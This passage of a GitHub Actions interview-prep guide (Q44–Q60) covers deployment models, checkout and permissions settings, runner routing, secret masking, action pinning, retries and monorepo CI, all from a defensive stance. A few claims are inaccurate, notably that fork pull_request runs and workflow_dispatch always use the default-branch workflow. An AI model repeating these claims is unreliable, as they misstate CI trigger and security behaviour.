          echo "build=${{ needs.build.result }}"  # success
          # decide outcome based on results, not just the implicit gate
```

```
            implicit gate (no if)        with if: always()
all needs ✓     job runs                   job runs
one need ✗      job SKIPPED (cascades)     job runs; inspect needs.*.result
one need skip   job SKIPPED                job runs; result == 'skipped'
cancelled       job skipped                use !cancelled() to exclude cancels
```

The reasoning an interviewer wants: skipped is distinct from failed and it *propagates*, so a single skipped upstream can silently neuter a whole branch of the DAG; `always()` is the override but it's a blunt instrument (also runs on cancel) so `if: ${{ !cancelled() }}` is often the precise choice; and once you override the gate you own the result-inspection logic. Being able to predict, for a given DAG with one failure, exactly which jobs run, skip, or fail — and why — is the expert-level competency this probes.

#### Q44. [Theory] Compare push-based deployment from Actions versus pull-based GitOps, and articulate where the credential and audit boundaries differ.

This is a platform-architecture question about *who initiates the deploy and where the cluster credentials live*. In **push-based** CD, the Actions job holds (or assumes via OIDC) credentials to the target — it runs `kubectl apply`, `helm upgrade`, or a cloud deploy CLI, pushing the new state into the environment. In **pull-based GitOps** (Argo CD, Flux), a controller *inside* the cluster watches a Git repo of manifests and **reconciles** the cluster to match; Actions' job ends at "commit the new image digest to the manifests repo," and the in-cluster controller pulls and applies. The difference reshapes the entire trust topology.

The credential boundary is the sharpest contrast. Push-based requires the *CI system* to hold cluster-admin-ish credentials (even short-lived via OIDC) and to have network reach into the cluster's API — a CI compromise becomes a cluster compromise, and you must expose the cluster to the runner network. Pull-based keeps cluster credentials **entirely inside** the cluster; the controller needs only read access to a Git repo, and the cluster API need not be reachable from CI at all. So GitOps shrinks the blast radius of a CI breach and removes inbound cluster exposure — at the cost of an extra component to run and a reconciliation-lag between "commit" and "applied."

```
PUSH (Actions runs kubectl)            PULL (Argo/Flux reconciles)
CI holds cluster creds   ── yes ──▶    CI holds only git write
Cluster API reachable    ── from CI    ── not required from CI
Source of truth          imperative    declarative repo state
Drift detection          none          continuous (self-heals)
Audit trail              CI logs       git history = desired state
Failure mode             partial apply controller retries to converge
Extra component          no            yes (the controller)
```

The audit and drift story favors pull-based: because the Git repo *is* the desired state, every change is a reviewable, revertable commit, and the controller **detects and corrects drift** (someone `kubectl edit`s prod → it's reverted to match Git). Push-based has no inherent drift detection and its audit trail is scattered across CI run logs. The expert framing for an interview is the common hybrid: **Actions for CI** (build, test, sign, push image, bump the manifest) plus **GitOps for CD** (controller reconciles) — getting GitHub's PR-integrated CI strengths *and* GitOps' credential isolation and drift control. The trade-off to name is latency and operational surface (you now run and secure a reconciler) versus a dramatically smaller CI blast radius.

#### Q45. [Theory] Why is `actions/checkout`'s `persist-credentials`, `fetch-depth`, and submodule handling worth understanding for both correctness and security?

`actions/checkout` looks trivial but its defaults encode correctness and security decisions that bite when you don't understand them. **`persist-credentials`** (default `true`) writes the `GITHUB_TOKEN` into `.git/config` as an extraheader so subsequent `git push`/`fetch` in the job authenticate automatically — convenient, but it means any later step (including a compromised dependency) can read that token from the git config. For hardened or untrusted-code jobs you set `persist-credentials: false` (and the action removes the credential in its `post` step regardless). **`fetch-depth`** defaults to `1` (a shallow clone of just the triggering commit) for speed; tools that need history — `git describe` for versioning, changelog generation, `git blame`, SonarQube's blame-based attribution, or diffing against a base — break or misbehave on a depth-1 clone, so you set `fetch-depth: 0` for a full history.

```yaml
- uses: actions/checkout@v4
  with:
    fetch-depth: 0            # full history (needed for tags/describe/blame/diff)
    persist-credentials: false # don't leave the token in .git/config
    submodules: recursive      # also fetch nested submodules
```

The submodule dimension is both a correctness and a security concern. By default submodules are **not** checked out; `submodules: true`/`recursive` fetches them, but private submodules need credentials the default `GITHUB_TOKEN` may not have for *other* repos — so you supply a PAT/deploy key, which then becomes a secret-management and least-privilege question. There's also a subtle correctness trap: shallow clones can't always resolve tags, so version-stamping that relies on `git describe --tags` silently produces wrong values on `fetch-depth: 1`.

```
default behaviour            why it matters
fetch-depth: 1 (shallow)     fast, but breaks describe/blame/base-diff → set 0
persist-credentials: true    token sits in .git/config → set false for hardened jobs
submodules: false            nested code missing → recursive; private needs extra creds
single-commit checkout       PR diffs need base; fetch base ref or depth 0
```

The expert synthesis ties these to the broader threat and correctness models: `persist-credentials` is the same lifecycle story as the `post`-step credential cleanup (defense against token theft by later steps), `fetch-depth` is a performance-vs-completeness knob that silently corrupts version metadata when wrong, and submodule auth drags in cross-repo least-privilege. Knowing *why* each default is what it is — and when to flip it — is what separates "I always copy-paste checkout" from someone who can debug a mysterious `git describe` failure or close a token-leak hole.

#### Q46. [Theory] How does `runs-on` label matching work, and what determines runner selection when multiple labels or runner groups are involved?

`runs-on` is the dispatcher's routing key, and its matching rule is "the runner must carry **all** of the requested labels" — it's an AND, not an OR. A GitHub-hosted label like `ubuntu-latest` is a single label that GitHub maps to its current Ubuntu image; passing an array (`runs-on: [self-hosted, linux, x64, gpu]`) requires a runner tagged with *every* one of those labels. This is why self-hosted runners get custom labels (`gpu`, `arm64`, `prod-net`) — you compose label sets to target a precise capability, and a job with a label no runner carries simply **queues forever** (a common "stuck pending" cause).

The selection internals layer runner *groups* on top of labels for self-hosted at org scale. A group is an access-control partition: it lists which repositories may use its runners. So the resolution is two-phase — first GitHub filters to runners in a group the repo is *allowed* to use, then within that set it matches labels, then assigns to any idle matching runner (or queues). Newer syntax adds `runs-on.group` and `runs-on.labels` as explicit keys to disambiguate group-vs-label when a name could be either.

```yaml
runs-on:
  group: gpu-pool          # which runner group (access-scoped)
  labels: [self-hosted, cuda-12]   # AND-matched within that group
```

```
job ── runs-on labels ──▶ filter to groups repo may use
                           ──▶ runners carrying ALL labels
                           ──▶ idle? assign : queue
no runner has all labels ──▶ job stays pending indefinitely
```

The expert nuance: hosted "larger runners" are also targeted by a custom label you define in settings, so `runs-on: my-16-core` routes to the bigger metered VM. And because matching is strict AND, a typo'd or missing label is indistinguishable from "no capacity" at the queue level — you diagnose it by checking whether *any* registered runner carries the full label set, not by waiting. Understanding label-AND plus group-access as the two gates is what makes "why is my job not picking up?" a five-second answer.

#### Q47. [Theory] What is the precedence order of environment variables and `permissions` across workflow, job, and step scopes, and how do defaults interact?

GitHub Actions resolves both `env` and `permissions` through a **scope hierarchy**, but the two follow *different* merge rules, which is a frequent source of surprise. For `env`, the rule is **innermost-wins override**: a step-level `env` shadows a job-level one, which shadows a workflow-level one, for the same key — and they *merge* across keys (a step sees workflow + job + step env unioned, with the closest scope winning ties). For `permissions`, the rule is **replacement, not merge**: if a job declares a `permissions` block, it *entirely replaces* the workflow-level block for that job rather than adding to it — so a job-level `permissions: { packages: write }` silently *drops* the workflow's `contents: read` unless you re-list it.

```yaml
permissions:           # workflow default
  contents: read
env:
  REGION: us-east-1
jobs:
  release:
    permissions:       # REPLACES the workflow block entirely for this job
      contents: write  # contents:read is gone unless re-declared; all else = none
      packages: write
    env:
      REGION: eu-west-1   # overrides workflow REGION for this job
    steps:
      - env: { REGION: ap-south-1 }   # overrides again for just this step
        run: echo "$REGION"           # prints ap-south-1
```

```
env       (MERGE, innermost wins)     permissions (REPLACE at the declaring scope)
step  ─┐                              job block present? → it fully defines the job's perms
job   ─┼─ union; nearest scope wins   no job block?       → inherits workflow block
wf    ─┘                              no block anywhere?   → repo/org default
```

The default interaction is the other half: if **no** `permissions` is set anywhere, the token gets the repo/org *default*, which historically was broad (read/write) and is now recommended (and often configured) to be read-only. Setting any `permissions:` block at all switches the job to **explicit mode** where unlisted scopes become `none` — which is why adding `packages: write` can paradoxically *break* a checkout-then-push job that relied on the default `contents` write. The senior insight is internalizing "env merges, permissions replace, and declaring permissions is opt-in-deny-everything-else" — getting that wrong produces both over-privilege and mysterious permission-denied failures.

#### Q48. [Theory] Why are container jobs and service containers structured the way they are, and how do they differ from running Docker inside a step?

GitHub offers three distinct ways to involve containers, and conflating them causes networking and lifecycle confusion. A **container job** (`jobs.<id>.container:`) runs *all your steps inside* that container — the runner starts the image, and every `run`/action executes within it, so your toolchain is the image's, not the host's. **Service containers** (`jobs.<id>.services:`) are *sidecar* containers (a Postgres, a Redis) the runner starts alongside the job for the job's lifetime; they're for dependencies your tests talk to, not for running your code. The third way — `docker run` *inside a step* — is just you driving Docker manually on the host runner, with no orchestration help from Actions.

The structure follows from networking and lifecycle. When you use a container job *plus* services, Actions puts them on a **user-defined Docker network** and lets you reach a service by its **label as hostname** (`postgres:5432`) — no port mapping needed because they share a network. But when your steps run on the **host** (no container job) and you use services, you must reach the service via **`localhost:<mapped-port>`** because the service's port is published to the host. Getting this wrong (`localhost` from inside a container job, or `servicename` from a host job) is the classic "connection refused" in CI.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container: node:20            # all steps run INSIDE this image
    services:
      db:
        image: postgres:16
        env: { POSTGRES_PASSWORD: pw }
        ports: ['5432:5432']
        options: >-
          --health-cmd pg_isready --health-interval 10s --health-retries 5
    steps:
      - run: psql -h db -U postgres   # hostname == service label (shared network)
```

```
                         reach the service via       runs your code in
container job + services  service label (db:5432)     the container image
host job + services       localhost:<published-port>  the host runner
docker run in a step      whatever you wired manually  the host runner
```

The deeper points: service containers support **health checks** (`--health-cmd`) so the runner waits until the dependency is actually ready before steps run — without that, your first test races the database's startup. Container jobs are **Linux-only** and run as a defined user (often root), and the workspace is bind-mounted in, so file permissions can surprise you. The expert framing is matching the mechanism to the need — container job for a controlled toolchain, services for ephemeral test dependencies, manual `docker run` only when you need full control — and remembering the hostname-vs-localhost rule that flips with where your steps execute.

#### Q49. [Practical] How would you debug a workflow that behaves differently on re-run vs first run, considering caches, `GITHUB_TOKEN` state, and ephemeral runners?

"Passes on re-run but failed first time" (or vice versa) is a hallmark of **hidden state**, and the systematic approach is to enumerate what *isn't* ephemeral. On GitHub-hosted runners the VM is destroyed each job, so the suspects are the things that survive across runs: the **dependency cache** (`actions/cache`), **artifacts**, **external mutable state** (a registry tag, a remote DB, a downstream environment), and **rate limits / token state**. A re-run that suddenly passes often means the *first* run populated a cache or artifact that the second run consumed — meaning your pipeline has an order dependency it shouldn't.

The debugging method is to make the run **hermetic and observable**, then bisect. First, re-run with **debug logging** enabled (set repo secrets/vars `ACTIONS_RUNNER_DEBUG=true` and `ACTIONS_STEP_DEBUG=true`, or use "Re-run with debug logging") to see step-level internals including cache hit/miss lines. Second, temporarily change the cache `key` to bust it and see if the "good" run still passes from cold — if it now fails, the cache was masking a real bug (e.g. a deleted dependency still present in cache). Third, check whether the difference correlates with `github.run_attempt` (which increments on re-run) — code that branches on first-vs-retry, or that consumes a one-shot external resource, reveals itself.

```yaml
steps:
  - run: echo "attempt=${{ github.run_attempt }}"   # 1 first time, 2+ on re-run
  - uses: actions/cache@v4
    with:
      path: ~/.npm
      key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}-v2  # bump to bust
  - run: npm ci   # if this fails only on a COLD cache, the cache was hiding a bug
```

```
suspect on re-run-differs:
  cache        → bust key, run cold; flaky if it masked a missing dep
  artifact     → does a later run consume a prior run's upload?
  token/rate   → 1st run exhausted an API quota; secondary-rate-limit errors
  ephemeral?   → hosted = fresh VM; self-hosted REUSED runner leaks state → use ephemeral
  run_attempt  → does logic branch on retry count?
  external     → registry/db/env mutated by run 1 changes run 2's path
```

The expert distinction is hosted vs self-hosted: on hosted runners state-leak is limited to caches/artifacts/external systems, but on a *reusable* self-hosted runner the **filesystem, installed packages, and even leftover credentials persist between jobs** — so "works on the second job on the same runner" points straight at non-ephemeral runners, and the fix is single-use ephemeral runners (ARC). The deliverable in an interview is the *method* — enumerate non-ephemeral state, force a cold/hermetic run, use debug logging and `run_attempt` — not a single guessed cause.

#### Q50. [Theory] What are the consistency and ordering guarantees of `schedule` (cron) triggers, and why do scheduled runs sometimes skip, drift, or run on the wrong ref?

The `schedule` trigger uses POSIX cron syntax but comes with weak guarantees that surprise people expecting a precise, reliable timer. First, **the minimum granularity is 5 minutes** and the time is **UTC** — there's no timezone field, so DST and local-time assumptions are a frequent bug. Second, scheduled runs are **best-effort, not guaranteed**: GitHub explicitly states high-load periods (especially the top of the hour, `0 * * * *`, when everyone schedules) can **delay or drop** runs. So a cron set to `0 0 * * *` may fire late or, rarely, skip entirely — you must not treat it as a hard SLA, and for critical timing you add an external scheduler or a self-healing catch-up check.

The "wrong ref" surprise is structural: scheduled workflows **always run against the default branch** and use the workflow file *from* the default branch, regardless of where you authored or last pushed. This is why a cron change on a feature branch does nothing until merged, and why a scheduled job can't be tested by pushing it to a topic branch. It also means `github.ref` inside a scheduled run is the default branch — any logic expecting the triggering ref to be something else is wrong.

```yaml
on:
  schedule:
    - cron: '17 3 * * 1-5'   # 03:17 UTC, Mon–Fri. Avoid '0 * * * *' (congested)
                              # 5-min granularity; UTC only; best-effort timing
```

```
guarantee                what actually holds
granularity              ≥ 5 minutes
timezone                 UTC only (no TZ field; mind DST)
punctuality              best-effort; may delay/drop under load (esp. :00)
delivery                 NOT exactly-once / not guaranteed to fire
ref / file source        always default branch (not the branch you edited)
disable on inactivity    auto-disabled after ~60 days no repo activity
```

A further operational gotcha: GitHub **auto-disables scheduled workflows in repos with no activity for ~60 days** (to save resources on abandoned repos), so a "why did our nightly stop running?" mystery often traces to repo inactivity rather than a YAML bug. The expert takeaways are to spread cron times off the hour to dodge congestion, never rely on cron for precise or guaranteed execution, design idempotent catch-up logic for missed runs, and remember scheduled runs are pinned to the default branch — which is both a testing inconvenience and a security property (you can't smuggle a scheduled run via a feature branch).

#### Q51. [Theory] Explain how GitHub Actions handles secret masking limitations, structured secrets, and the difference between secret availability and secret usability on fork PRs.

Secret masking is a **post-hoc log filter**, and understanding its limits is essential to not leaking credentials. The runner registers each secret's literal value and replaces exact occurrences in log output with `***`. The limitations cascade from "exact occurrences": multi-line secrets are masked line-by-line (each line registered separately), so a secret with structure can partially leak if reformatted; **transformations defeat masking** entirely (base64-decode, URL-encode, JSON-escape, or even just `tr` the secret and the new bytes aren't registered); and very short or common secret values cause over-masking that garbles unrelated logs. The mitigation is `::add-mask::` to register *derived* values at runtime, plus simply not echoing secrets.

Structured secrets (a JSON blob stored as one secret) are a known foot-gun: if you store `{"user":"x","pass":"y"}` as a secret and then `jq` out individual fields, those field values are **not masked** because only the whole-blob string was registered. The robust pattern is either to store each field as a separate secret, or to `::add-mask::` each field immediately after extracting it and before any other use.

```yaml
steps:
  - env:
      BLOB: ${{ secrets.DB_JSON }}      # whole blob is masked
    run: |
      PASS=$(echo "$BLOB" | jq -r .pass)  # extracted value is NOT masked!
      echo "::add-mask::$PASS"            # register it before doing anything else
      ./connect.sh "$PASS"
```

```
masking reality
exact-string match only      transform (b64/jq/slice) → unmasked
multi-line                   masked per line; reflow can leak
short/common value           over-masks unrelated text
derived/structured fields    must ::add-mask:: manually
```

The fork-PR dimension adds a second axis: **availability vs usability**. On a `pull_request` from a fork, secrets are simply **not provided** — the context evaluates them to empty, so the question isn't "are they masked?" but "they aren't there at all." This is distinct from a same-repo run where secrets exist and masking governs leakage. The expert synthesis is to treat masking as a *defense-in-depth backstop, never a primary control* (because transformation trivially bypasses it), store secrets at the right granularity, `::add-mask::` anything derived, and design pipelines so that fork PRs — which legitimately have *no* secrets — don't try to use them and fail confusingly.

#### Q52. [Theory] Compare strategies for sharing data across workflow runs (cache, artifacts, OIDC-fetched remote state, repo commits) and their durability/consistency trade-offs.

Different "share state across runs" needs map to different mechanisms with very different durability and consistency properties, and choosing wrong yields either data loss or race conditions. **Cache** is best-effort and evictable (LRU past ~10 GB, ~7-day idle expiry, branch-scoped) — perfect for regenerable data (dependencies, build intermediates) where a miss is merely slower, never wrong. **Artifacts** are durable for their retention window (configurable, defaults around 90 days), explicitly addressed, and meant for outputs you hand off or keep — but they're scoped to a run and not designed as a key-value store across arbitrary runs. **External remote state** (an S3 bucket, a database, Terraform state) accessed via OIDC is the right tool when you need *durable, cross-run, consistent* state — and it's where you get real locking. **Committing back to the repo** (a bot push of generated files, a version bump) is durable and auditable but mutates history and risks trigger loops (recall `GITHUB_TOKEN` pushes don't re-trigger, which is sometimes a feature, sometimes a bug).

```
mechanism          durability        consistency        right for
actions/cache      best-effort/evict none (last-writer) regenerable intermediates
artifacts          retention window  immutable (v4)      run outputs / handoff
remote (S3/DB)     durable           locks available     cross-run authoritative state
repo commit        permanent/audited git serialization  generated source, version bumps
```

The consistency story is the deciding factor for *coordination*. Cache and artifacts have **no locking** — two concurrent runs both writing the "same" cache key race, and v4 artifact immutability means the *second* writer simply fails rather than corrupting, but neither gives you read-modify-write safety. If two pipelines must not clobber each other's state (Terraform, a shared counter), you need real locking: DynamoDB lock tables for TF state, a database transaction, or GitHub's **`concurrency`** group to serialize the runs at the workflow level so only one mutates at a time.

The expert framing: cache for *speed* (loss-tolerant), artifacts for *handoff* (run-scoped, immutable), remote state for *authority* (durable + lockable), repo commits for *auditable generated content*. The most common mistake is abusing `actions/cache` as durable storage — it will silently evict your "saved" data and there's no consistency guarantee — when the requirement actually called for an external store with locking or a `concurrency` serializer.

#### Q53. [Theory] What is the difference between `workflow_run`, `workflow_call`, and chaining via `needs`, for orchestrating multi-workflow pipelines?

These three compose workflows at different granularities and trust levels, and picking the right one shapes both security and observability. **`needs`** chains *jobs within a single workflow* — same run, shared run context, jobs see each other's `outputs`, and the whole thing is one entry in the Actions UI. **`workflow_call`** composes *workflow files into one run* — the called reusable workflow's jobs execute as part of the caller's run with a typed inputs/outputs/secrets contract; it's synchronous composition (the caller's dependent jobs wait for the callee). **`workflow_run`** is fundamentally different: it's an **event** that fires *after another workflow completes*, starting a **separate, independent run** — decoupled, asynchronous, and (critically) it runs in the context of the **default branch** with access to secrets even if the triggering workflow was a fork PR.

```
needs            one run, job DAG          shared outputs, single UI entry
workflow_call    one run, files composed   typed contract, synchronous, caller waits
workflow_run     separate run, event-based after-the-fact, async, default-branch context
```

```yaml
# workflow_run: a privileged follow-up after untrusted CI finishes
on:
  workflow_run:
    workflows: ["CI"]          # name of the upstream workflow
    types: [completed]
jobs:
  publish:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-latest
    # runs with secrets + default-branch workflow, even if CI ran on a fork PR
```

The security-defining use of `workflow_run` is the **safe-privileged-follow-up** pattern: run untrusted fork-PR builds with no secrets on `pull_request`, then have a `workflow_run`-triggered workflow (which *does* have secrets and runs trusted default-branch code) react to the result — e.g. download the build artifact and publish a coverage comment. Because `workflow_run` executes the *trusted* workflow with the *fork's data as inert input*, you get privilege without handing secrets to untrusted code — the correct alternative to the dangerous `pull_request_target`-checks-out-PR-code pattern.

The trade-offs: `needs` is simplest and most observable but confined to one workflow; `workflow_call` gives governance and reuse but couples the runs synchronously and is bounded by nesting limits; `workflow_run` gives decoupling and the secrets-after-untrusted-CI security pattern but is harder to follow in the UI (two separate runs), can't pass typed inputs (you fish data out of `github.event.workflow_run` and artifacts), and adds latency. The expert signal is reaching for `workflow_run` specifically when you need *asynchronous, privileged reaction to an untrusted run* — and for `needs`/`workflow_call` when you want synchronous, observable composition.

#### Q54. [Theory] How does action versioning by tag, branch, and SHA actually resolve, and why is a "floating major tag" like `@v4` both convenient and a supply-chain risk?

Action references in `uses:` resolve against the *referenced repository's git refs*, and the three forms (`@v4`, `@v4.1.1`, `@main`, `@<sha>`) differ in **mutability**, which is the entire security story. `@<full-sha>` resolves to an immutable commit — the bytes can never change. A tag like `@v4.1.1` is *conventionally* immutable but technically a **movable pointer**: the maintainer (or an attacker who compromises the repo) can delete and re-create the tag pointing at different code. A "floating major" like `@v4` is *designed* to move — maintainers re-point it to each new `v4.x` release so consumers get patches automatically. `@main` is the most mutable: it's whatever the branch tip is right now.

The convenience/risk trade-off is sharpest for the floating major. `@v4` means you automatically receive bug fixes and security patches without editing your workflow — genuinely valuable. But it also means the code you run **changes out from under you** without any change in *your* repo, and if the upstream tag is hijacked (the 2025 `tj-actions/changed-files` incident re-pointed tags to secret-exfiltrating code across thousands of consumers), every repo pinned to the floating tag silently runs the malicious version on its next run. SHA-pinning removes that entire class of attack because the reference is content-addressed.

```
ref form        mutable?   you get patches?   supply-chain exposure
@<full sha>     no         no (manual bump)   minimal (content-addressed)
@v4.1.1         movable    no                 tag could be re-pointed
@v4 (floating)  yes (by design) yes           HIGH (tag hijack = silent RCE)
@main           yes        yes (every change) HIGHEST
```

```yaml
# Hardened: immutable SHA + readable comment Dependabot keeps current
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

The resolution mechanics matter for a subtle reason: GitHub resolves the ref *at run time*, not when you write the workflow, so two runs of the *same unchanged workflow* can execute *different action code* if the tag moved between them — which is exactly why "it worked yesterday" failures (and breaches) happen with floating tags. The reconciling best practice closes the gap: **pin to a full SHA** for immutability, keep the human-readable version in a trailing comment, and let **Dependabot** bump the SHA via reviewable PRs — you get the patch stream of `@v4` with the immutability guarantee of a SHA, turning the convenience-vs-safety dilemma into "both."

## 🧩 Extended Questions — Set 2: Practical, Operational & Troubleshooting

### 🟢 Basic — extended

#### Q55. [Practical] Your CI run is "stuck" — a job sits in queued/pending forever and never starts. How do you diagnose it?

A perpetually-pending job is almost always a **dispatch/routing problem**, not a code problem, so the first move is to stop reading your YAML steps and look at *why no runner picked it up*. The three dominant causes, in order of frequency: (1) a `runs-on` label that no registered runner carries — since label matching is strict AND, a typo like `ubunto-latest` or a self-hosted label `[self-hosted, gpu]` where no GPU runner is online means the job waits indefinitely with no error; (2) you've hit your **account concurrency limit** (max concurrent jobs for your plan) so the job is legitimately queued behind others; (3) a required **approval gate** — a first-time contributor's PR or a protected environment is waiting on a human to click "Approve and run."

The diagnostic sequence is fast once you know where to look. Open the run, expand the pending job, and read the banner — GitHub usually says "Waiting for a runner to pick up this job" or "Waiting for approval." For self-hosted, check Settings → Actions → Runners and confirm a runner is **online (idle)** and carries the *exact* label set; an offline runner or a missing label is indistinguishable from "no capacity" at the queue. For hosted, check the org's billing/usage to see if you're throttled or out of minutes.

```
pending job → check the run banner
  "waiting for a runner"  → label mismatch OR no idle runner OR out of minutes
  "waiting for approval"  → environment reviewer / first-time-contributor gate
  no banner, just queued  → account concurrency limit reached

self-hosted verify:
  Settings → Actions → Runners → status Idle? labels match runs-on EXACTLY?
```

The anti-pattern is "re-run and hope." A stuck job will stay stuck on re-run because the input (the label set, the quota, the gate) hasn't changed. The senior habit is to treat queued-forever as a *scheduling* question — does a runner exist that satisfies every label, is there capacity, and is a gate involved — and verify each in seconds rather than guessing at the workflow logic.

#### Q56. [Practical] How do you set timeouts and prevent a hung step from burning 6 hours of runner minutes?

By default a job can run for up to **6 hours** on a hosted runner (and 35 days of total workflow time), so a hung `npm test` waiting on a dead socket, or a deploy script blocking on a prompt, will silently consume the full window and your minutes before it's killed. The fix is explicit, layered timeouts: `timeout-minutes` at the **job** level as a hard ceiling, and at the **step** level for the operations you know should be quick. A job-level timeout protects against the whole thing hanging; step-level timeouts give you a tighter, more diagnostic failure ("the deploy step timed out at 10m" is more actionable than "the job hit 6h").

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 20          # whole job killed at 20m
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
        timeout-minutes: 5       # install shouldn't take longer
      - run: npm test
        timeout-minutes: 10      # tests get their own ceiling
```

The reasoning is both cost and feedback. A hung job not only wastes minutes — it holds a concurrency slot and delays everything queued behind it, so a single stuck deploy can stall a team's whole pipeline. Tight timeouts turn an open-ended hang into a fast, named failure you can retry or debug. Pick the values from observed p95 durations plus headroom; too-tight timeouts cause flaky failures on legitimately slow runs, so leave a margin.

A complementary control is `cancel-in-progress` concurrency (so a newer commit kills the stale build) and, for steps that are *expected* to be flaky on the network, a retry wrapper rather than a longer timeout. The interview signal is knowing the 6-hour default exists, that it's silent, and that `timeout-minutes` is the cheap insurance — most teams discover this only after a hung job shows up on the bill.

#### Q57. [Practical] A teammate's workflow change "works on their branch" but the scheduled/required version didn't update. Walk through why.

This is one of the most common "ghost" complaints, and it has two distinct mechanical explanations depending on the trigger. For **`schedule`** and **`workflow_dispatch`**, GitHub always reads the workflow file from the **default branch** — so editing `nightly.yml` on a feature branch changes nothing for the cron until it's merged. The teammate "sees it work" because they manually ran it from their branch via push, but the 2 AM cron keeps using `main`'s copy. The fix is simply: merge to default, or for testing, temporarily change the cron and push to default behind a feature flag, then revert.

For **required status checks** in branch protection, the subtlety is that protection rules reference a check by **name**, and the check only counts if a workflow *with that job name* actually reports. If the teammate renamed the job, or a `paths` filter caused the workflow to be skipped, the PR can hang "waiting for a required check that never reports" — the check name in the ruleset no longer matches reality, or the skipped workflow produces no status at all.

```
symptom                           cause
cron change has no effect         schedule reads default branch, not feature branch
dispatch uses old logic           workflow_dispatch also reads default branch
PR stuck on required check        renamed job, or path-filtered-out workflow never reports
"green on my branch, red on PR"   fork PR runs base default-branch workflow, not the PR's
```

The deeper teaching point is that *which version of a workflow runs is event-dependent*. Branch-iterable triggers (`push`, same-repo `pull_request`) use the ref's copy; default-branch-pinned triggers (`schedule`, `workflow_dispatch`, fork `pull_request`) do not. Knowing this turns a half-day "why won't my change apply?" mystery into a one-line answer, and it's also why you can't smuggle a malicious scheduled job via a feature branch.

### 🟡 Intermediate — extended

#### Q58. [Practical] Your CI is slow (12+ minutes). Walk through how you'd profile and cut the time without breaking correctness.

I'd treat it as a profiling problem, not a guessing problem: first *measure* where the wall-clock goes, then attack the long pole. The run's timing view shows per-job and per-step durations; I look for (a) the **critical path** through the `needs` DAG (parallel jobs only cost the slowest leg), (b) steps that re-do work every run (cold dependency installs, full rebuilds), and (c) serial work that could be parallel. A 12-minute run usually has one or two dominant costs — typically dependency install and the test suite.

The highest-leverage, correctness-safe levers in order: **cache dependencies** keyed on the lockfile (a warm `~/.npm`/`~/.m2`/pip cache turns a 90s install into seconds); **parallelize** independent jobs (lint, unit, integration) so they overlap instead of chaining via `needs`; **shard the test suite** across matrix legs so 1000 tests run as 4×250; and **scope work with path filters or change detection** so a docs-only PR skips the build. None of these change *what* runs, only *how fast/when* — so correctness is preserved.

```yaml
jobs:
  test:
    strategy:
      matrix:
        shard: [1, 2, 3, 4]      # split the suite into 4 parallel legs
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: 'npm' }   # built-in dep cache
      - run: npm ci
      - run: npx jest --shard=${{ matrix.shard }}/4   # 1/4 of tests per leg
```

```
before:  install(90s) ─▶ build(120s) ─▶ test(420s)            = ~10.5m serial
after:   install(cached 8s) ─▶ build(cached layers 30s)
                              └─▶ test ×4 shards (~120s each)  = ~2.5m
```

The trade-offs to name: sharding adds per-shard fixed overhead (checkout + install repeated), so beyond a point you pay more setup than you save — tune shard count to where the suite, not the setup, dominates. Caching can *mask* bugs (a stale cache hiding a removed dependency), so the cache key must include the lockfile hash and you should periodically run cold. And larger/faster runners are a money lever, not an engineering one — reach for them only after the structural wins. The senior answer is "measure the critical path, cache the regenerable, parallelize the independent, shard the big suite, skip the irrelevant" — in that order.

#### Q59. [Practical] How do you implement retry-with-backoff for flaky network/deploy steps, and when is retrying the wrong fix?

Transient failures — a registry blip, an STS throttle, a momentarily-unready service — are real and retrying is legitimate, but it must be *bounded and targeted*, not a blanket "retry everything." For a single shell step I wrap the command in a bash retry loop with exponential backoff so a one-off `503` doesn't fail the pipeline; for an action I use a maintained retry action (e.g. `nick-fields/retry`) which adds attempt limits, timeouts, and backoff declaratively.

```yaml
- name: Deploy with bounded retry
  run: |
    for attempt in 1 2 3; do
      if ./deploy.sh; then exit 0; fi
      echo "attempt $attempt failed; backing off"
      sleep $((attempt * 10))      # 10s, 20s, 30s exponential-ish backoff
    done
    echo "deploy failed after 3 attempts" >&2
    exit 1
```

```yaml
# declarative alternative (SHA-pin in real use)
- uses: nick-fields/retry@v3
  with:
    max_attempts: 3
    timeout_minutes: 10
    retry_wait_seconds: 30
    command: ./deploy.sh
```

The crucial judgment is **when retrying is the wrong fix**. Retrying masks two things you must *not* hide: (1) a genuine bug or flaky test that should be fixed, not papered over — a test that passes 1-in-3 is broken, and auto-retrying it ships nondeterminism into your quality gate; and (2) a **non-idempotent** operation, where retrying after a partial success causes double-execution (charging a card twice, creating duplicate resources, a half-applied migration that the retry then conflicts with). Before adding a retry I ask "is this operation idempotent, and is the failure actually transient?" If it's a deterministic failure (bad config, a real assertion), retrying just burns minutes and delays the real signal.

The hardened pattern is: retry only the *outermost idempotent* operation, cap attempts and total time, log each attempt so flakiness is *visible* (you want a dashboard of retry rates, because a rising retry rate is a leading indicator of an upstream problem), and never auto-retry tests as a substitute for de-flaking them. The senior framing is that retry is a resilience tool for transient infra faults, not a way to make a broken pipeline go green.

#### Q60. [Practical] Design a monorepo CI strategy that only builds/tests the services affected by a change.

The goal is to avoid the monorepo tax — running every service's full pipeline on every commit when only one package changed. There are two viable strategies. The lightweight one uses **path filters** (or `dorny/paths-filter`) to detect which top-level areas changed and conditionally run their jobs. The robust one uses a **build-graph-aware tool** (Nx, Turborepo, Bazel, Pants) that knows the *dependency graph* between packages and computes the true "affected" set — so changing a shared library correctly triggers everything downstream of it, which naive path filters miss.

```yaml
jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.f.outputs.api }}
      web: ${{ steps.f.outputs.web }}
    steps:
      - uses: actions/checkout@v4
      - id: f
        uses: dorny/paths-filter@v3
        with:
          filters: |
            api: ['services/api/**', 'libs/shared/**']   # api depends on shared
            web: ['services/web/**', 'libs/shared/**']

  api:
    needs: changes
    if: needs.changes.outputs.api == 'true'
    runs-on: ubuntu-latest
    steps: [ { run: ./ci.sh services/api } ]
```

```
push touches libs/shared/**
   │ paths-filter maps shared → BOTH api and web (declared dependency)
   ▼
changes job → api=true, web=true → both downstream jobs run

push touches services/web/** only
   ▼
changes job → web=true, api=false → only web job runs (api skipped)
```

